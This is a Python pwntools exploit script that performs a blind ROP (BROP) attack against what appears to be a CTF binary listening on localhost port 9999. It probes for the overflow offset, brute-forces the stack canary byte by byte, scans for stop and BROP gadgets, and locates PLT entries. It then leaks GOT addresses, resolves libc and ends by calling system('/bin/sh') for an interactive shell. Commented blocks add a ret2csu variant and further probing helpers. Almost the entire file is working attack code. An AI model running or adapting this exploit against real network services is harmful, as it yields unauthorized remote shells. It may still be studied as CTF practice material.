#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. need to compile with -fstack-protector -no-pie, since need to find gadget
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'
#context(os='linux', arch='amd64', log_level='debug')

junk = 0
crash_addr = p64(0xffffffffffffffff)
crash_addr_list = crash_addr * 20

def getOffset():
    i = 1
    while True:
        p = remote('127.0.0.1', 9999)
        p.recvuntil('WelCome my friend,Do you know password?\n')
        p.send('a' * i)
        try:
            output = p.recv()
            if not output.startswith('No password'):
                return i - 1
            else:
                i += 1
        except EOFError:
            return i - 1
        finally:
            p.close()

# ONLY works when canary is not change when program crash
def getCanary(overflow):
    for ch in range(0, 256):
        p = remote('127.0.0.1', 9999)
        p.recvuntil('WelCome my friend,Do you know password?\n')
        p.send(overflow + chr(ch))
        try:
            output = p.recv()
            if output.startswith('No password'):
                print ("canary byte is " , ch)
                return overflow + chr(ch)
        except EOFError:
            pass
        finally:
            p.close()

def getOverflow():
    offset = getOffset()
    overflow = 'a' * offset
    for i in range(0, 8):
        overflow = getCanary(overflow)
    overflow += 'a' * 8 #saved fame pointer

def isStopGadget(overflow, addr):
    p = remote('127.0.0.1', 9999)
    p.recvuntil('WelCome my friend,Do you know password?\n')
    payload = overflow + p64(addr) + crash_addr_list
    p.send(payload)
    try:
        output = p.recv(timeout=1)
        if output.endswith('WelCome my friend,Do you know password?\n'):  # restart program
            return True
    except EOFError:
        pass
    finally:
        p.close()

# get last stop gadget to help identify brop gadget
def getStopGadget(overflow):
    stop_gadget = 0x400000
    for addr in range(0x400000, 0x401000):
        if isStopGadget(overflow, addr):
            print 'candidate stop= ' + hex(addr)
            stop_gadget = addr
        addr += 1
    return stop_gadget

def getBropGadget(overflow, stop_gadget):
    addr = stop_gadget + 1 # brop gadget always behind stop gadget
    while True:
        p = remote('127.0.0.1', 9999)
        p.recvuntil('WelCome my friend,Do you know password?\n')
        payload = overflow + p64(addr) + crash_addr * 6 + p64(stop_gadget) + crash_addr_list
        p.send(payload)
        try:
            output = p.recv(timeout=1)
            if output.endswith('WelCome my friend,Do you know password?\n') and (not isStopGadget(overflow, addr)): # restart program
                return addr
        except EOFError:
            pass
        finally:
            addr += 1
            p.close()

def setPayloadBropGadget(overflow, brop_gadget, addr, *args):
    length = len(args)
    # 4007b0:	4c 89 ea             	mov    %r13,%rdx
    # 4007ca:	5b                   	pop    %rbx
    payload = overflow + p64(brop_gadget) \
              + p64(0) + p64(1) + p64(addr) \
              + p64(length >=3 and args[2] or junk) + p64(length >=2 and args[1] or junk) + p64(args[0])\
              + p64(brop_gadget - 0x1a)
    return payload

def setPayload2Args(overflow, brop_gadget, addr, *args):
    length = len(args)
    # brop_gadget + 0x9: pop rdi, ret
    # brop_gadget + 0x7: pop rsi, pop r15, ret
    payload = overflow + p64(brop_gadget + 0x9) + p64(args[0]) \
              + p64(brop_gadget + 0x7) + p64(length >=2 and args[1] or junk) + p64(junk) \
              + p64(addr)
    return payload

# write(STDOUT, 0x400000, 4)
def leakByWrite(p, overflow, stop_gadget, brop_gadget, write_plt, addr, length):
    data = ''
    while length > 0:
        p.recvuntil('WelCome my friend,Do you know password?\n')
        # rdx set by read
        payload = setPayload2Args(overflow, brop_gadget, write_plt, 1, addr) + p64(stop_gadget)
        p.send(payload)
        try:
            output = p.recv(numb=length, timeout=1)
            data += output
            addr += len(output)
            length -= len(output)
        except EOFError:
            return None
    return data

# puts(0x400000): copying from the address specified (str) until it reaches the terminating null character ('\0'). This terminating null-character is not copied to the stream.
def leakByPuts(p, overflow, stop_gadget, brop_gadget, puts_plt, addr, length):
    data = ''
    left = length
    while left > 0:
        p.recvuntil('Do you know password?\n')
        payload = setPayload2Args(overflow, brop_gadget, puts_plt, addr) + p64(stop_gadget)
        p.send(payload)
        try:
            output = p.recvuntil('\nWelCome my friend,', timeout=1)
            index = output.rfind('\n')
            if index == -1:
                return None
            output = output[:index]
            output += '\0'
            data += output
            index += 1
            addr += index
            left -= index
        except EOFError:
            return None
    return data[:length]

def guessPlt(overflow, stop_gadget, brop_gadget, isWrite):
    for addr in range(0x400001, 0x401000):
        p = remote('127.0.0.1', 9999)
        if isWrite:
            data = leakByWrite(p, overflow, stop_gadget, brop_gadget, addr, 0x400000, 4)
        else:
            data = leakByPuts(p, overflow, stop_gadget, brop_gadget, addr, 0x400000, 4)
        p.close()
        if data and data.startswith('\x7fELF'):
            return addr
    return None

# 400580: ff 35 82 0a 20 00 ff 25 84 0a 20 00 0f 1f 40 00
# 400590:	                ff 25 82 0a 20 00 68 00 00 00 00
def getGot(addr, data):
    index = data.find('\x68\0\0\0\0')
    if index > -1:
        print "index = " , index
        return addr + index + u32(data[index-4 : index])
    else:
        return addr + 6 + u32(data[2:6])

offset = getOffset()
print 'offset= ' , offset
overflow = 'a' * offset
stop_gadget = getStopGadget(overflow)
#stop_gadget = 0x4006f7 #0x4006fd
print 'stop_gadget= ' + hex(stop_gadget)
brop_gadget = getBropGadget(overflow, stop_gadget)
#brop_gadget = 0x4007ca
print 'brop_gadget= ' + hex(brop_gadget)

write_plt = guessPlt(overflow, stop_gadget, brop_gadget, True)
#write_plt = 0x4005a0
#write_plt = None
if write_plt:
    print 'write_plt= ' + hex(write_plt)
    p = remote('127.0.0.1', 9999)
    data = leakByWrite(p, overflow, stop_gadget, brop_gadget, write_plt, write_plt, 0x1b)
    write_got = getGot(write_plt, data)
    #write_got = 0x601020
    print 'write_got= ' + hex(write_got)
    data = leakByWrite(p, overflow, stop_gadget, brop_gadget, write_plt, write_got, 8)
    symbol = 'write'
else:
    puts_plt = guessPlt(overflow, stop_gadget, brop_gadget, False)
    #puts_plt = 0x400585
    print 'puts_plt= ' + hex(puts_plt)
    p = remote('127.0.0.1', 9999)
    data = leakByPuts(p, overflow, stop_gadget, brop_gadget, puts_plt, puts_plt, 0x1b)
    puts_got = getGot(puts_plt, data)
    # puts_got = 0x601020
    print 'puts_got= ' + hex(puts_got)
    data = leakByPuts(p, overflow, stop_gadget, brop_gadget, puts_plt, puts_got, 8)
    symbol = 'puts'

symbol_addr = u64(data)
print 'symbol_addr= ' + hex(symbol_addr)
libc = LibcSearcher(symbol, symbol_addr)
libc_base = symbol_addr - libc.dump(symbol)
system_addr = libc_base + libc.dump('system')
print 'system_addr= ' + hex(system_addr)
binsh_addr = libc_base + libc.dump('str_bin_sh')
print 'binsh_addr= ' + hex(binsh_addr)

p.recvuntil('Do you know password?\n')
payload = setPayload2Args(overflow, brop_gadget, system_addr, binsh_addr)
p.send(payload)
p.interactive()



'''
read_plt = elf.symbols['read']
print 'read_plt= ' + hex(read_plt)
write_plt = elf.symbols['write']
print 'write_plt= ' + hex(write_plt)
read_got = elf.got['read']
print 'read_got= ' + hex(read_got)
write_got = elf.got['write']
print 'write_got= ' + hex(write_got)
start_addr = elf.start # it would fail if using elf.symbols['main']
print 'start_addr= ' + hex(start_addr)
vulfun_addr = elf.symbols['vulnerable_function']
print 'vulfun_addr= ' + hex(vulfun_addr)
bss_addr = elf.bss()
print "bss_addr=" + hex(bss_addr)

offset = 136 #return by pattern.py
junk = 0

#pop junk, rbx, rbp, r12, r13, r14, r15
pop_junk_rbx_rbp_r12_r13_r14_r15 = 0x4005d6 #0x400606
# Notice rdx and rdi sequence!!!!
#mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
#mov_mov_mov_call = 0x4005F0
#junk, rbx=0, rbp=1, r12=fun_addr_relative, r13=rdi, r14=rsi, r15=rdx
#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
mov_mov_mov_call = 0x4005c0
#junk, rbx=0, rbp=1, r12=fun_addr_relative, r13=rdx, r14=rsi, r15=rdi
def callByCsuInit(fun_addr_relative, *args):
  length = len(args)
  payload = "a" * offset + p64(pop_junk_rbx_rbp_r12_r13_r14_r15) \
            + p64(junk) + p64(0) + p64(1) + p64(fun_addr_relative) \
            + p64(length >=3 and args[2] or junk) + p64(length >=2 and args[1] or junk) + p64(args[0]) \
            + p64(mov_mov_mov_call) + "a" * 7 * 8 + p64(start_addr)
  p.recvuntil("Hello, World\n")
  p.send(payload)


# 1. leak read_got by write_got
callByCsuInit(write_got, 1, read_got, 8)
read_addr = u64(p.recv(8))
print 'read_addr= ' + hex(read_addr)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#0x0000000000035fc8 : pop rax ; ret
pop_rax_ret_libc = 0x0000000000035fc8
pop_rax_ret = read_addr + (pop_rax_ret_libc - libc.symbols['read'])
print 'pop_rax_ret= ' + hex(pop_rax_ret)

# 2. leak _dl_runtime_resolve by write_got
#400426:	ff 25 e4 0b 20 00    	jmpq   *0x200be4(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
resolve_point = 0x601010
callByCsuInit(write_got, 1, resolve_point, 8)
resolve_addr = u64(p.recv(8))
print 'resolve_addr= ' + hex(resolve_addr)

# (gdb) x/100 0x00007ffff7deecc0
#   0x7ffff7deecc0 <_dl_runtime_resolve_avx_slow>:
# 0x7ffff7deedce <_dl_runtime_resolve_avx+174>:
#    callq  0x7ffff7de7bc0 <_dl_fixup>
# 0x7ffff7deedd3 <_dl_runtime_resolve_avx+179>:	mov    %rax,%r11
# 0x7ffff7deedfa <_dl_runtime_resolve_avx+218>:	mov    0x170(%rsp),%r9
# not work in latest ld.so



sleep(1) # would fail if not sleep!!! since send data would mess up
p.send(p64(system_addr))
p.send("/bin/sh\0")
print "finish writing to bss"

# 3. call system('/bin/sh')
callFun(bss_addr, bss_addr + 8)
p.interactive()
'''
'''
def isPlt(overflow, stop_gadget, addr):
    for i in range(1, 3):  # at least contains two glt item for read and write
        addr += 0x10
        #p = process('hctf2016-brop/brop.write')
        p = remote('127.0.0.1', 9999)
        p.recvuntil('WelCome my friend,Do you know password?\n')
        payload = overflow + p64(addr) + p64(stop_gadget) + crash_addr_list
        p.send(payload)
        try:
            output = p.recv(timeout=1)
            if len(output)>0:
                return True
        except EOFError:
            pass
        finally:
            p.close()

def getPlt(overflow, stop_gadget):
    for addr in range(0x400580, stop_gadget):
        p = process('hctf2016-brop/brop.write')
        #p = remote('127.0.0.1', 9999)
        p.recvuntil('WelCome my friend,Do you know password?\n')
        payload = overflow + p64(addr) + p64(0) + p64(stop_gadget) + crash_addr_list
        p.send(payload)
        try:
            output = p.recv(timeout=1)
            output = p.recv(timeout=1)
            output = p.recv(timeout=1)
            if len(output)>0 and isPlt(overflow, stop_gadget, addr):  # restart program
                return addr
        except EOFError:
            pass
        finally:
            p.close()

def getWriteGot(overflow, brop_gadget, write_plt):
    p = remote('127.0.0.1', 9999)
    p.recvuntil('WelCome my friend,Do you know password?\n')
    # rdx set by read
    payload = setPayload2Args(overflow, brop_gadget, write_plt, 1, write_plt)
    p.send(payload)
    output = p.recv(6, timeout=1)
    p.close()
    write_got = u32(output[2:6])
    # 4005a0:	ff 25 7a 0a 20 00    	jmpq   *0x200a7a(%rip) # 601020 <write@GLIBC_2.2.5>
    # 4005a6:	68 01 00 00 00       	pushq  $0x1
    write_got += write_plt + 6
    return write_got
'''